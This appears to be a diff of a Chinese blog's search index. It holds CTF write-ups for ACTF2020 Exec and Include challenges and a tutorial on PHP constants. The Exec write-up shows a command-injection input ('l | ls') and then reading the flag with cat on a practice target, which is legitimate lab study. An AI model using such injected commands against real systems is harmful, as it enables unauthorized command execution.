+<img src="[ACTF2020 新生赛]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" />
+
+<p>确实是这样，一步一步查找，在根目录下找到了<code>flag</code></p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" />
+
+<p>使用<code>cat</code>命令读取</p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ACTF2020_新生赛_Include</title>
     <url>//buu_ACTF2020Include.html</url>
     <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
@@ -2399,37 +2484,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>
 
 <p>得到了flag</p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACTF2020_新生赛_Exec</title>
-    <url>//buu_ACTF2020Exec.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<p>点进靶机界面如下</p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />
-
-<p>结合题目名，猜测是命令执行</p>
-<p>输入<code>l | ls</code></p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" />
-
-<p>确实是这样，一步一步查找，在根目录下找到了<code>flag</code></p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" />
-
-<p>使用<code>cat</code>命令读取</p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />
-
 ]]></content>
       <categories>
         <category>web</category>
@@ -3040,6 +3094,33 @@
       </tags>
   </entry>
   <entry>
+    <title>php中的系统常量</title>
+    <url>//php_systemVar.html</url>
+    <content><![CDATA[<p>php中的常量</p>
+<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
+<a id="more"></a>
+
+
+
+<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP_VERSION:		<span class="comment">// php的版本号</span></span><br><span class="line">PHP_INT_SIZE:		<span class="comment">// 整型的大小</span></span><br><span class="line">PHP_INT_MAX:		<span class="comment">// 整型能表示的最大值</span></span><br><span class="line">PHP_OS 				<span class="comment">// 当前PHP环境的运行操作系统</span></span><br><span class="line">M_PI 				<span class="comment">// 圆周率常量值</span></span><br><span class="line">M_E 				<span class="comment">// 科学常数e</span></span><br><span class="line">E_ERROR 			<span class="comment">// 最近的错误之处</span></span><br><span class="line">E_WARNING 			<span class="comment">// 最近的警告之处</span></span><br><span class="line">E_PARSE 			<span class="comment">// 剖析语法有潜在问题之处</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量是会根据环境的变化而发生变化的变量</p>
+<p>由<code>__xxx__</code>形式构成</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> 		<span class="comment">// 当前PHP文件的绝对路径路径(会带上文件名)</span></span><br><span class="line"><span class="keyword">__DIR__</span>			<span class="comment">// 当前文件的目录(绝对路径)</span></span><br><span class="line"><span class="keyword">__LINE__</span> 		<span class="comment">// 当前PHP文件中所在的行号</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> 	<span class="comment">// 当前函数名，只对函数内调用起作用</span></span><br><span class="line"><span class="keyword">__CLASS__</span> 		<span class="comment">// 当前类名，只对类起作用</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>	<span class="comment">// 当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__METHOD__</span> 		<span class="comment">// 表示类方法名，比如B::test</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php中的文件包含</title>
     <url>//php_fileinclude.html</url>
     <content><![CDATA[<p>php文件包含</p>
@@ -3102,33 +3183,6 @@
 <blockquote>
 <p>那么问题来了，如果构成了循环的嵌套包含会怎么样</p>
 </blockquote>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php中的系统常量</title>
-    <url>//php_systemVar.html</url>
-    <content><![CDATA[<p>php中的常量</p>
-<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
-<a id="more"></a>
-
-
-
-<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP_VERSION:		<span class="comment">// php的版本号</span></span><br><span class="line">PHP_INT_SIZE:		<span class="comment">// 整型的大小</span></span><br><span class="line">PHP_INT_MAX:		<span class="comment">// 整型能表示的最大值</span></span><br><span class="line">PHP_OS 				<span class="comment">// 当前PHP环境的运行操作系统</span></span><br><span class="line">M_PI 				<span class="comment">// 圆周率常量值</span></span><br><span class="line">M_E 				<span class="comment">// 科学常数e</span></span><br><span class="line">E_ERROR 			<span class="comment">// 最近的错误之处</span></span><br><span class="line">E_WARNING 			<span class="comment">// 最近的警告之处</span></span><br><span class="line">E_PARSE 			<span class="comment">// 剖析语法有潜在问题之处</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量是会根据环境的变化而发生变化的变量</p>
-<p>由<code>__xxx__</code>形式构成</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> 		<span class="comment">// 当前PHP文件的绝对路径路径(会带上文件名)</span></span><br><span class="line"><span class="keyword">__DIR__</span>			<span class="comment">// 当前文件的目录(绝对路径)</span></span><br><span class="line"><span class="keyword">__LINE__</span> 		<span class="comment">// 当前PHP文件中所在的行号</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> 	<span class="comment">// 当前函数名，只对函数内调用起作用</span></span><br><span class="line"><span class="keyword">__CLASS__</span> 		<span class="comment">// 当前类名，只对类起作用</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>	<span class="comment">// 当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__METHOD__</span> 		<span class="comment">// 表示类方法名，比如B::test</span></span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>web</category>
